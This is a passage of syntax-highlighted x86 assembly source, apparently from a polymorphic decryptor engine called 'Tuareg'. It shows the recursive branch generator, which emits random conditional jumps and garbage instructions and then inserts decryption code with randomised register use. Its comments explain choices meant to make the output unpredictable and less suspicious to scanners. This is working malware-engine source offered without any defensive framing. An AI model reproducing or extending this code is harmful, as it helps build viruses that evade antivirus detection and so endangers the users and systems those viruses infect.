</span><span class="sc1">;; This function is the branch generator (and it's auto-callable).</span><span class="sc0">
</span><span class="sc5">Branching</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BifurcationNumber</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Increase bifurcation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BifurcationNumber</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">; Have we coded</span><span class="sc0">
                                                          </span><span class="sc1">; 4 in this stream?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InsertFunctionalCode</span><span class="sc0"> </span><span class="sc1">; If so, insert decryption code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpingArrayNdx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Insert this address into</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">JumpingArray</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; the jumping array. Later</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; we can jump to here ran-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpingArrayNdx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; domly.</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">      </span><span class="sc1">; Make a random comparision with a</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Instruct_2</span><span class="sc0">       </span><span class="sc1">; random register. We want to jump</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@CMP</span><span class="sc0">              </span><span class="sc1">; very randomly, so we select some</span><span class="sc0">
                                         </span><span class="sc1">; quite unpredictable jumps like TEST</span><span class="sc0">
                                         </span><span class="sc1">; Reg,PowerOf2/J(N)Z NextBranch, and</span><span class="sc0">
                                         </span><span class="sc1">; things like that</span><span class="sc0">
       </span><span class="sc5">@@TEST</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; TEST Reg,PowerOf2</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">    </span><span class="sc1">; A power of two has only a bit set in all</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; the number, so we get a random between 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; and 32 and SHL 1 by that number. Since</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">    </span><span class="sc1">; it's only a bit and we check that bit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; from a garbage register, it can be</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; set or clear, so we make J(N)Z and we</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; won't know which branch the execution is</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TEST_EAX</span><span class="sc0">   </span><span class="sc1">; going to take.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@BitComparision</span><span class="sc0"> </span><span class="sc1">; Jump to there to set only JZ/JNZ</span><span class="sc0">
         </span><span class="sc5">@@TEST_EAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0">   </span><span class="sc1">; Set TEST EAX,xxx opcode (it's very sus-</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">              </span><span class="sc1">; picious to have a TEST EAX with the gene-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; ral opcode</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@BitComparision</span><span class="sc0">

       </span><span class="sc5">@@CMP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">  </span><span class="sc1">; Compare register...</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP_Reg</span><span class="sc0">      </span><span class="sc1">; ...with a register</span><span class="sc0">
         </span><span class="sc5">@@CMP_Value</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; or with a value. In this case, the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; value is random, so the conditional</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; jump is random too. I avoid the JZ/</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP_EAX_Value</span><span class="sc0">   </span><span class="sc1">; JNZ because they only work when the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; value is exact. Instead of that, I</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F881h</span><span class="sc0">      </span><span class="sc1">; use JA, JB, JG, JLE, etc.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CMP_01</span><span class="sc0">
         </span><span class="sc5">@@CMP_EAX_Value</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; Set CMP EAX,xxx opcode.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
      </span><span class="sc5">@@CMP_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@AbsoluteComparision</span><span class="sc0"> </span><span class="sc1">; Jump to here to select other </span><span class="sc0">
                                            </span><span class="sc1">; type of jumps, different from </span><span class="sc0">
                                            </span><span class="sc1">; BitComparision</span><span class="sc0">
         </span><span class="sc5">@@CMP_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">       </span><span class="sc1">; Compare with register. It's the same</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0707h</span><span class="sc0">    </span><span class="sc1">; as a value, but we set a random regis-</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; ter, avoiding the same one.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP_Reg</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc0">      </span><span class="sc1">; CMP opcode</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@AbsoluteComparision</span><span class="sc0">   </span><span class="sc1">; jump to there</span><span class="sc0">

       </span><span class="sc5">@@Instruct_2</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; Another type of random comparision. We</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; do OR Reg,Reg or AND Reg,Reg and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; we jump with JS/JNS.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AND</span><span class="sc0">
        </span><span class="sc5">@@OR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">   </span><span class="sc1">; OR opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Inst2_2</span><span class="sc0">
        </span><span class="sc5">@@AND</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">   </span><span class="sc1">; AND opcode</span><span class="sc0">
     </span><span class="sc5">@@Inst2_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0"> </span><span class="sc1">;Set second opcode with "Register mode"</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@Inst2_3</span><span class="sc0">  </span><span class="sc1">; Use random flag (already unchanged)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; Use alternative opcode (since the register</span><span class="sc0">
                                </span><span class="sc1">; is the same, we don't care anymore)</span><span class="sc0">
     </span><span class="sc5">@@Inst2_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; Set the selected register to the second op.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
  </span><span class="sc5">@@AbsoluteComparision2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; JS, JNS</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">setnz</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; JS, JNS</span><span class="sc0">
  </span><span class="sc5">@@InsertCJmp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Op_CJumps</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the selected</span><span class="sc0">
                                                         </span><span class="sc1">; jump from the table</span><span class="sc0">
 </span><span class="sc5">@@InsertCJmp2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">   </span><span class="sc1">; Since the branches are going to take quite</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; more size than 128 bytes, we use 32 bits</span><span class="sc0">
                                  </span><span class="sc1">; conditional jumps.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; Save in stack the address of this jump</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">          </span><span class="sc1">; Make space for the displacement of the jump</span><span class="sc0">
                               </span><span class="sc1">; (for later calculation)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextBranch</span><span class="sc0"> </span><span class="sc1">; Code next branches (one following this</span><span class="sc0">
                                   </span><span class="sc1">; code and another where the jump will jump</span><span class="sc0">
                                   </span><span class="sc1">; randomly)</span><span class="sc0">
  </span><span class="sc5">@@BitComparision</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">setnz</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">     </span><span class="sc1">; JZ, JNZ</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InsertCJmp</span><span class="sc0">   </span><span class="sc1">; It's clear, I think (it's the same as</span><span class="sc0">
                                     </span><span class="sc1">; before)</span><span class="sc0">
  </span><span class="sc5">@@AbsoluteComparision</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; CMP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">    </span><span class="sc1">; Select one of the following conditional</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">  </span><span class="sc1">; jumps:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">  </span><span class="sc1">; JS, JNS, JB, JBE, JA, JAE, JG, JL, JGE, JLE</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@AbsoluteComparision</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Op_CJumps</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InsertCJmp2</span><span class="sc0">

</span><span class="sc1">;; After coding the random-behaviour conditional jump, we arrive here. This</span><span class="sc0">
</span><span class="sc1">;; code will call recursively the function we are in until the number of bi-</span><span class="sc0">
</span><span class="sc1">;; furcations in the branch arrives to 5, moment when we'll code the decryp-</span><span class="sc0">
</span><span class="sc1">;; tion instructions, the index checks and all that.</span><span class="sc0">
 </span><span class="sc5">@@NextBranch</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Branching</span><span class="sc0">  </span><span class="sc1">; Code left branch of the jump (the NO-JUMP</span><span class="sc0">
                                   </span><span class="sc1">; condition)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Pop from stack the address where the dis-</span><span class="sc0">
                                   </span><span class="sc1">; placement of the jump coded before is.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Calculate the distance of the jump</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Complete the jump</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Branching</span><span class="sc0">  </span><span class="sc1">; Calculate the right branch (the JUMP con-</span><span class="sc0">
                                   </span><span class="sc1">; dition)</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BifurcationNumber</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrease the number</span><span class="sc0">
                                      </span><span class="sc1">; of bifurcations, since we are going to</span><span class="sc0">
                                      </span><span class="sc1">; exit from the function Branching (to</span><span class="sc0">
                                      </span><span class="sc1">; return to another run of Branching or</span><span class="sc0">
                                      </span><span class="sc1">; return completely to function Tuareg).</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">   </span><span class="sc1">; Return!</span><span class="sc0">

</span><span class="sc1">;; When we reach the level 5 of recursivity in this function (Branching), then</span><span class="sc0">
</span><span class="sc1">;; the "functional code" (decryption instructions, indexes modifications, the</span><span class="sc0">
</span><span class="sc1">;; loop check and the jump to the decrypted part is inserted, and moreover the</span><span class="sc0">
</span><span class="sc1">;; code of thesubroutines created until this moment).</span><span class="sc0">

</span><span class="sc5">@@InsertFunctionalCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BranchIdentifier</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">; *40h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfTuaregStackFrame</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BifurcationNumber</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrease the recur-</span><span class="sc0">
                                             </span><span class="sc1">; sivity level for the returning</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;Use of buffer register?</span><span class="sc0">
                                                      </span><span class="sc1">;(bits 1-2=00)</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoBufferReg</span><span class="sc0">      </span><span class="sc1">; If not, jump</span><span class="sc0">
       </span><span class="sc1">;; With buffer register</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get buffer register in DL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Set it as</span><span class="sc0">
                                                               </span><span class="sc1">; "touched"</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">; Exchange Index1 and 2?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@XchgNdxs1</span><span class="sc0">          </span><span class="sc1">; Please do</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Use Index1 in DH</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_01</span><span class="sc0">
   </span><span class="sc5">@@XchgNdxs1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Use Index2 in DH</span><span class="sc0">
      </span><span class="sc5">@@IFC_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVRegReg</span><span class="sc0">        </span><span class="sc1">; Make MOV BufferReg,IndexXReg (or</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">    </span><span class="sc1">; similar) and some garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DL=Buffer register</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">; Exchange Index1 and 2?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@XchgNdxs2</span><span class="sc0">          </span><span class="sc1">; Please do</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Use Index2 in DH</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_02</span><span class="sc0">
   </span><span class="sc5">@@XchgNdxs2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Use Index1 in DH</span><span class="sc0">
      </span><span class="sc5">@@IFC_02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORRegReg</span><span class="sc0">        </span><span class="sc1">; Do XOR BufferReg,IndexXReg (the</span><span class="sc0">
                                           </span><span class="sc1">; IndexX that wasn't used before)</span><span class="sc0">
